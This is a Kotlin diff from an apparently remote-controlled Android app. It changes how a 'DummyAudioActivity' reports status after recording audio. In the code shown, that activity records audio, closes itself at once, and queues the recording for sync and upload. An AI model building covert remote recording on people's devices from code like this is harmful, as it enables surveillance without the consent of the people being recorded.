@@ -105,22 +105,23 @@ class DummyAudioActivity : AppCompatActivity() {
                     recorder.release()
 
                     // Send Step 2 status message
-                    val transport = NextJsServerTransport(ctx)
-                    transport.send(
-                        ctx,
-                        "Audio captured successfully! Saved locally to ${outputFile.name}. Queued for Google Drive upload...",
-                        "audio"
-                    )
+                    val transport = com.neubofy.veto.transports.TransportHelper.getTransportFromIntent(ctx, intent)
+                    val serverTransport = NextJsServerTransport(ctx)
+                    val msg = "Audio captured successfully! Saved locally to ${outputFile.name}. Queued for Google Drive upload..."
+                    serverTransport.send(ctx, msg, "audio")
+                    if (transport !is NextJsServerTransport) {
+                        transport.send(ctx, msg, "audio")
+                    }
 
                     // Finish activity immediately
                     runOnUiThread { finish() }
 
                     // Trigger smart syncer for recent files (< 1 min)
-                    MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = "audio")
+                    MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = "audio", originatingTransport = transport)
 
                 } catch (e: Exception) {
                     ctx.log().e(TAG, "Audio recording failed: ${e.message}")
-                    val transport = NextJsServerTransport(ctx)
+                    val transport = com.neubofy.veto.transports.TransportHelper.getTransportFromIntent(ctx, intent)
                     transport.send(ctx, "Audio recording failed: ${e.message}", "audio")
                     try { recorder.release() } catch (_: Exception) {}
                     runOnUiThread { finish() }
